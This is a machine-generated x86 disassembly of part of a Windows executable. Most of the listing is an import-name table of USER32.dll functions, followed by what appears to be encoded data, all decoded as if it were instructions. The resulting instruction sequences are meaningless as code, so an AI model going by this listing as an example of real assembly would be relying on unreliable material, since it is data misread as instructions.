  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
